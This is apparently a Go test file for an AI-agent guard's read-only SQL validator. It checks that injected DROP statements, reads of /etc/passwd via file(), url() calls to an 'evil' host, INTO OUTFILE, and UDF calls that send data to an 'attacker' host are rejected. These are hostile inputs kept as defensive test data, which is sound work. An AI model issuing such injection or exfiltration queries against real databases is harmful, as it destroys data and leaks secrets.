package skills

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/timeplus/agentguard/internal/config"
)

// TestValidateReadOnlySQL is the binding accept/reject matrix from the task-6
// brief (spec §6.2). Do not add cases into this slice — extra hardening
// cases live in TestValidateReadOnlySQLHardening below so this matrix stays
// verifiable against the brief verbatim.
func TestValidateReadOnlySQL(t *testing.T) {
	cases := []struct {
		name, sql string
		wantErr   string // substring, "" = accept
		wantIn    string // substring expected in rewritten SQL
	}{
		{"plain select", "SELECT 1", "", "LIMIT 100"},
		{"table select", "SELECT * FROM table(agentguard_cim_event)", "", "LIMIT 100"},
		{"with cte", "WITH t AS (SELECT 1) SELECT * FROM t", "", "LIMIT 100"},
		{"keeps small limit", "SELECT 1 LIMIT 5", "", "LIMIT 5"},
		{"clamps big limit", "SELECT 1 LIMIT 999999", "", "LIMIT 1000"},
		{"trailing semicolon ok", "SELECT 1;", "", "LIMIT 100"},
		{"multi statement", "SELECT 1; SELECT 2", "single statement", ""},
		{"insert", "INSERT INTO x VALUES (1)", "must start with SELECT", ""},
		{"embedded drop", "SELECT 1 FROM t; DROP STREAM x", "single statement", ""},
		{"create keyword", "SELECT * FROM (SELECT 1) CREATE", "forbidden keyword", ""},
		{"settings", "SELECT 1 SETTINGS max_threads=1", "forbidden keyword", ""},
		{"bare stream read", "SELECT * FROM agentguard_cim_event", "table(", ""},
		{"join bare stream", "SELECT * FROM table(a) JOIN agentguard_rules USING (x)", "table(", ""},
		{"keyword in string ok", "SELECT 'please INSERT nothing' FROM table(a)", "", "LIMIT 100"},
		{"comment stripped", "SELECT 1 -- DROP STREAM x", "", "LIMIT 100"},
		{"block comment stripped", "SELECT /* INSERT */ 1", "", "LIMIT 100"},
		{"system tables allowed", "SELECT name FROM system.tables", "", "LIMIT 100"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, err := ValidateReadOnlySQL(c.sql, 1000)
			if c.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected reject: %v", err)
				}
				if !strings.Contains(out, c.wantIn) {
					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
				}
			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
			}
		})
	}
}

// TestValidateReadOnlySQLHardening covers adversarial bypasses beyond the
// binding matrix: comment-prefixed keywords, lowercase forms, semicolons
// inside comments, multi-CTE lists, nested bare streams, schema-qualified
// bare streams, and the SYSTEM keyword vs. the "system." table prefix.
func TestValidateReadOnlySQLHardening(t *testing.T) {
	cases := []struct {
		name, sql string
		wantErr   string
		wantIn    string
	}{
		{"comment-prefixed insert rejected", "/*x*/INSERT INTO y VALUES (1)", "must start with SELECT", ""},
		{"lowercase insert rejected", "insert into x values (1)", "must start with SELECT", ""},
		{"lowercase create rejected", "select * from (select 1) create", "forbidden keyword", ""},
		{"lowercase drop rejected", "select * from table(a); drop stream x", "single statement", ""},
		{"semicolon inside line comment ok", "SELECT 1 -- ; DROP STREAM x", "", "LIMIT 100"},
		{"semicolon inside block comment ok", "SELECT 1 /* ; DROP STREAM x */", "", "LIMIT 100"},
		{"multiple ctes", "WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a JOIN b ON 1=1", "", "LIMIT 100"},
		{"bare stream inside subquery", "SELECT * FROM (SELECT * FROM agentguard_cim_event)", "table(", ""},
		{"bare stream with schema prefix", "SELECT * FROM mydb.agentguard_cim_event", "table(", ""},
		{"stream name prefixed with system but not system schema", "SELECT * FROM systemx_tables", "table(", ""},
		{"bare system keyword forbidden", "SELECT 1 SYSTEM STOP MERGES", "forbidden keyword", ""},
		{"system dot table not forbidden", "SELECT * FROM system.v_failed_mat_views", "", "LIMIT 100"},
		{"whitespace before limit clamped", "SELECT 1   LIMIT    999999", "", "LIMIT 1000"},
		{"case-insensitive limit clamp", "select 1 limit 999999", "", "LIMIT 1000"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, err := ValidateReadOnlySQL(c.sql, 1000)
			if c.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected reject: %v", err)
				}
				if !strings.Contains(out, c.wantIn) {
					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
				}
			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
			}
		})
	}
}

// TestValidateReadOnlySQLTask7Fixes covers the adversarial-review findings
// fixed after task 6 shipped: comma-joined FROM sources that bypass the
// immediate-source-only bare-stream check, trusted table(...) interiors,
// LIMIT clamping for the OFFSET/comma forms, and OUTFILE/INFILE.
func TestValidateReadOnlySQLTask7Fixes(t *testing.T) {
	cases := []struct {
		name, sql string
		wantErr   string
		wantIn    string
	}{
		// Finding 1: comma-joined bare streams must still be caught.
		{"comma joined bare stream after table()", "SELECT * FROM table(a), agentguard_cim_event", "table(", ""},
		{"comma joined bare stream after subquery+alias", "SELECT * FROM (SELECT 1) x, agentguard_rules", "table(", ""},
		{"comma joined bare stream after system table", "SELECT * FROM system.tables, agentguard_cim_event", "table(", ""},
		// Finding 2: table(...) interior must be a single plain identifier.
		{"table() wrapping url() rejected", "SELECT * FROM table(url('http://evil'))", "table() must wrap a plain stream name", ""},
		{"table() wrapping file() rejected", "SELECT * FROM table(file('/etc/passwd'))", "table() must wrap a plain stream name", ""},
		// Finding 3: LIMIT clamp must cover OFFSET and comma forms, and
		// never append a duplicate LIMIT when one already exists.
		{"limit offset clamped", "SELECT 1 LIMIT 999999 OFFSET 5", "", "LIMIT 1000 OFFSET 5"},
		{"limit comma clamped", "SELECT 1 LIMIT 10, 999999", "", "LIMIT 10, 1000"},
		{"limit offset within bound stays intact, no duplicate limit", "SELECT 1 LIMIT 5 OFFSET 2", "", "LIMIT 5 OFFSET 2"},
		// Finding 4: OUTFILE/INFILE are forbidden client directives.
		{"into outfile rejected", "SELECT * FROM table(a) INTO OUTFILE '/tmp/x'", "forbidden keyword", ""},
		{"infile rejected", "SELECT * FROM table(a) INTO INFILE '/tmp/x'", "forbidden keyword", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, err := ValidateReadOnlySQL(c.sql, 1000)
			if c.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected reject: %v", err)
				}
				if !strings.Contains(out, c.wantIn) {
					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
				}
			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
			}
		})
	}
}

// TestValidateReadOnlySQLTask7NoDuplicateLimitAppend guards the "leave
// unchanged, don't append a second LIMIT" branch for a LIMIT form the
// clamp regexes don't recognize (LIMIT present but not end-anchored in a
// clampable shape) — the presence check must still suppress the append.
func TestValidateReadOnlySQLTask7NoDuplicateLimitAppend(t *testing.T) {
	out, err := ValidateReadOnlySQL("SELECT 1 LIMIT 5 OFFSET 2", 1000)
	if err != nil {
		t.Fatalf("unexpected reject: %v", err)
	}
	if strings.Count(strings.ToUpper(out), "LIMIT") != 1 {
		t.Fatalf("expected exactly one LIMIT clause, got %q", out)
	}
}

// TestValidateReadOnlySQLFromWalkFailClosed covers a bypass found in the
// FROM-list comma-walk: the alias-skip consumed at most one pseudo-alias
// token, then silently stopped (returned nil) if the next non-whitespace
// token wasn't a comma — so an extra/unrecognized token (SAMPLE, a second
// alias-shaped word, ...) between a validated source and a comma-joined
// bare stream let that bare stream slip through unvalidated. The fix makes
// the walk fail-closed: after a source + optional alias, the next token
// must be a comma, a recognized clause keyword, end-of-string, or a ")"
// closing an enclosing scope — anything else is rejected.
func TestValidateReadOnlySQLFromWalkFailClosed(t *testing.T) {
	cases := []struct {
		name, sql string
		wantErr   string
		wantIn    string
	}{
		// Bypasses that must become rejects.
		{"sample before comma bypass", "SELECT * FROM table(a) SAMPLE 0.1, bare_stream", "unrecognized token in FROM clause", ""},
		{"sample offset before comma bypass", "SELECT * FROM table(a) SAMPLE 0.1 OFFSET 0.5, bare_stream", "unrecognized token in FROM clause", ""},
		{"extra alias token bypass", "SELECT * FROM table(a) x y, bare_stream", "unrecognized token in FROM clause", ""},
		// Accepts that must keep working (regression guard).
		{"table call no alias", "SELECT * FROM table(a)", "", "LIMIT 100"},
		{"table call bare alias", "SELECT * FROM table(a) t1", "", "LIMIT 100"},
		{"table call as alias", "SELECT * FROM table(a) AS t1", "", "LIMIT 100"},
		{"two table sources", "SELECT * FROM table(a), table(b)", "", "LIMIT 100"},
		{"two table sources with aliases", "SELECT * FROM table(a) t1, table(b) t2", "", "LIMIT 100"},
		{"clause keywords after source", "SELECT * FROM table(a) WHERE x > 0 GROUP BY y ORDER BY z LIMIT 5", "", "LIMIT 5"},
		{"join two table sources", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id", "", "LIMIT 100"},
		{"cte reference", "WITH t AS (SELECT 1) SELECT * FROM t", "", "LIMIT 100"},
		{"system tables", "SELECT name FROM system.tables", "", "LIMIT 100"},
		{"subquery wrapping table", "SELECT * FROM (SELECT a, b FROM table(x))", "", "LIMIT 100"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, err := ValidateReadOnlySQL(c.sql, 1000)
			if c.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected reject: %v", err)
				}
				if !strings.Contains(out, c.wantIn) {
					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
				}
			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
			}
		})
	}
}

// TestValidateReadOnlySQLJoinPredicateCommaBypass covers a bypass found by
// AST-diffing against real Timeplus: a comma-joined bare stream AFTER a
// JOIN's ON/USING predicate was accepted because the FROM-walk stopped
// cleanly the moment it saw ON/USING, never resuming source-list validation
// past the predicate to notice the trailing ", bare_stream". The fix makes
// ON/USING a "consume the predicate, then keep walking the source list"
// step instead of a walk-terminating one, so a comma (or a chained JOIN)
// after the predicate is still reached and validated.
func TestValidateReadOnlySQLJoinPredicateCommaBypass(t *testing.T) {
	cases := []struct {
		name, sql string
		wantErr   string
		wantIn    string
	}{
		// Bypasses that must become rejects.
		{"comma after ON predicate", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id, bare_stream", "table(", ""},
		{"comma after USING predicate", "SELECT * FROM table(a) JOIN table(b) USING (id), bare_stream", "table(", ""},
		{"comma after RIGHT JOIN ON predicate", "SELECT * FROM table(a) RIGHT JOIN table(b) ON a.id=b.id, bare_stream", "table(", ""},
		{"comma after ASOF JOIN ON predicate", "SELECT * FROM table(a) ASOF JOIN table(b) ON a.t<b.t, bare_stream", "table(", ""},
		{"comma after chained JOIN ON predicates", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id JOIN table(c) ON b.id=c.id, bare_stream", "table(", ""},

		// Legit joins that must keep working (regression guard).
		{"plain join on", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id", "", "LIMIT 100"},
		{"join using", "SELECT * FROM table(a) JOIN table(b) USING (id)", "", "LIMIT 100"},
		{"left join on", "SELECT * FROM table(a) LEFT JOIN table(b) ON a.id=b.id", "", "LIMIT 100"},
		{"right join on", "SELECT * FROM table(a) RIGHT JOIN table(b) ON a.id=b.id", "", "LIMIT 100"},
		{"inner join on", "SELECT * FROM table(a) INNER JOIN table(b) ON a.id=b.id", "", "LIMIT 100"},
		{"cross join", "SELECT * FROM table(a) CROSS JOIN table(b)", "", "LIMIT 100"},
		{"asof join on", "SELECT * FROM table(a) ASOF JOIN table(b) ON a.t<b.t", "", "LIMIT 100"},
		{"chained joins no trailing comma", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id JOIN table(c) ON b.id=c.id", "", "LIMIT 100"},
		{"aliased join", "SELECT * FROM table(a) t1 JOIN table(b) t2 ON t1.id=t2.id", "", "LIMIT 100"},
		{"where after join", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id WHERE a.id > 0", "", "LIMIT 100"},
		{"group order limit after join", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id GROUP BY a.id ORDER BY a.id LIMIT 5", "", "LIMIT 5"},
		{"having after join", "SELECT * FROM table(a) JOIN table(b) ON a.id=b.id GROUP BY a.id HAVING count(*) > 1", "", "LIMIT 100"},
		{"system table joined", "SELECT * FROM system.tables t JOIN table(a) ON t.name=a.name", "", "LIMIT 100"},
		{"cte with join", "WITH t AS (SELECT 1) SELECT * FROM t", "", "LIMIT 100"},
		{"nested subquery with join", "SELECT * FROM (SELECT * FROM table(a) JOIN table(b) ON a.id=b.id)", "", "LIMIT 100"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, err := ValidateReadOnlySQL(c.sql, 1000)
			if c.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected reject: %v", err)
				}
				if !strings.Contains(out, c.wantIn) {
					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
				}
			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
			}
		})
	}
}

// TestValidateReadOnlySQLSystemAllowlist covers the fix restricting
// "system.*" reads to an explicit allowlist of diagnostic tables
// (system.tables/columns/functions/v_failed_mat_views) instead of any
// system.* identifier — system.users/settings/processes etc. must now be
// rejected.
func TestValidateReadOnlySQLSystemAllowlist(t *testing.T) {
	cases := []struct {
		name, sql string
		wantErr   string
		wantIn    string
	}{
		{"system.tables allowed", "SELECT name FROM system.tables", "", "LIMIT 100"},
		{"system.columns allowed", "SELECT * FROM system.columns", "", "LIMIT 100"},
		{"system.functions allowed", "SELECT * FROM system.functions", "", "LIMIT 100"},
		{"system.v_failed_mat_views allowed", "SELECT * FROM system.v_failed_mat_views", "", "LIMIT 100"},
		{"system.tables in join allowed", "SELECT * FROM system.tables t JOIN table(a) ON t.name=a.name", "", "LIMIT 100"},
		{"system.users rejected", "SELECT * FROM system.users", "only system.tables/columns/functions/v_failed_mat_views are readable", ""},
		// "settings" also collides with the forbidden SETTINGS keyword, so
		// this is rejected earlier in the pipeline (still a reject either way).
		{"system.settings rejected", "SELECT * FROM system.settings", "forbidden keyword", ""},
		{"system.processes rejected", "SELECT * FROM system.processes", "only system.tables/columns/functions/v_failed_mat_views are readable", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, err := ValidateReadOnlySQL(c.sql, 1000)
			if c.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected reject: %v", err)
				}
				if !strings.Contains(out, c.wantIn) {
					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
				}
			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
			}
		})
	}
}

// TestValidateReadOnlySQLReviewFixes covers the #237 hardening: table(system.*)
// must clear the same allowlist as the bare form, dlp_* network UDFs are not
// callable via run_sql (SSRF/exfil), and "LIMIT n BY" (per-group cap) is
// rejected so it can't slip past the total-row clamp.
func TestValidateReadOnlySQLReviewFixes(t *testing.T) {
	cases := []struct {
		name, sql string
		wantErr   string
		wantIn    string
	}{
		// table(system.*) allowlist parity
		{"table(system.tables) allowed", "SELECT name FROM table(system.tables)", "", "LIMIT 100"},
		{"table(system.users) rejected", "SELECT * FROM table(system.users)", "only system.tables/columns/functions/v_failed_mat_views are readable", ""},
		{"table(system.processes) rejected", "SELECT * FROM table(system.processes)", "only system.tables/columns/functions/v_failed_mat_views are readable", ""},
		// dlp_* network UDFs denied (no FROM needed — the SSRF shape)
		{"dlp_embed denied", `SELECT dlp_embed('x','user','{"base_url":"http://attacker/collect"}')`, "not callable via run_sql", ""},
		{"dlp_risk denied", `SELECT dlp_risk('x', [], '{"base_url":"http://attacker"}')`, "not callable via run_sql", ""},
		{"dlp_embed in subquery denied", "SELECT dlp_embed((SELECT tool_result FROM table(agentguard_cim_event) LIMIT 1), 'user', '{}')", "not callable via run_sql", ""},
		{"dlp_summarize with spacing denied", "SELECT dlp_summarize ('x','{}')", "not callable via run_sql", ""},
		// a stream/column whose name merely contains "dlp_" is NOT a call and must pass
		{"agentguard_cim table with dlp-like column ok", "SELECT event_id FROM table(agentguard_cim_event)", "", "LIMIT 100"},
		// dlp_ inside a string literal is DATA, not a call
		{"dlp_ in string literal ok", "SELECT event_id FROM table(agentguard_cim_event) WHERE tool_result = 'dlp_embed(x)'", "", "LIMIT 100"},
		// LIMIT n BY rejected
		{"LIMIT n BY rejected", "SELECT * FROM table(agentguard_cim_event) LIMIT 1 BY session_id", "LIMIT n BY", ""},
		{"plain LIMIT still fine", "SELECT * FROM table(agentguard_cim_event) LIMIT 5", "", "LIMIT 5"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, err := ValidateReadOnlySQL(c.sql, 1000)
			if c.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected reject: %v", err)
				}
				if !strings.Contains(out, c.wantIn) {
					t.Fatalf("rewritten %q missing %q", out, c.wantIn)
				}
			} else if err == nil || !strings.Contains(err.Error(), c.wantErr) {
				t.Fatalf("want error containing %q, got %v", c.wantErr, err)
			}
		})
	}
}

func TestRunSQLSkillMetadata(t *testing.T) {
	s := NewRunSQL()
	if s.Name() != "run_sql" {
		t.Fatalf("Name() = %q, want run_sql", s.Name())
	}
	if s.Access() != ReadOnly {
		t.Fatalf("Access() = %v, want ReadOnly", s.Access())
	}
	params := s.Params()
	props, ok := params["properties"].(map[string]any)
	if !ok {
		t.Fatalf("Params() properties missing or wrong type: %#v", params)
	}
	if _, ok := props["sql"]; !ok {
		t.Fatalf("Params() missing sql property: %#v", params)
	}
}

func TestRunSQLExecuteMissingArg(t *testing.T) {
	s := NewRunSQL()
	rc := &RunContext{Cfg: &config.Config{}, SQLTimeoutMs: 1000, SQLMaxRows: 1000, ResultMaxBytes: 4096}
	out, err := s.Execute(context.Background(), rc, json.RawMessage(`{}`))
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !strings.HasPrefix(out, "error:") {
		t.Fatalf("want error: prefix, got %q", out)
	}
}

func TestRunSQLExecuteBadJSON(t *testing.T) {
	s := NewRunSQL()
	rc := &RunContext{Cfg: &config.Config{}, SQLTimeoutMs: 1000, SQLMaxRows: 1000, ResultMaxBytes: 4096}
	out, err := s.Execute(context.Background(), rc, json.RawMessage(`not json`))
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !strings.HasPrefix(out, "error:") {
		t.Fatalf("want error: prefix, got %q", out)
	}
}

func TestRunSQLExecuteValidationFailure(t *testing.T) {
	s := NewRunSQL()
	rc := &RunContext{Cfg: &config.Config{}, SQLTimeoutMs: 1000, SQLMaxRows: 1000, ResultMaxBytes: 4096}
	args, _ := json.Marshal(map[string]string{"sql": "DROP STREAM x"})
	out, err := s.Execute(context.Background(), rc, args)
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !strings.HasPrefix(out, "error:") || !strings.Contains(out, "must start with SELECT") {
		t.Fatalf("want validation error result, got %q", out)
	}
}
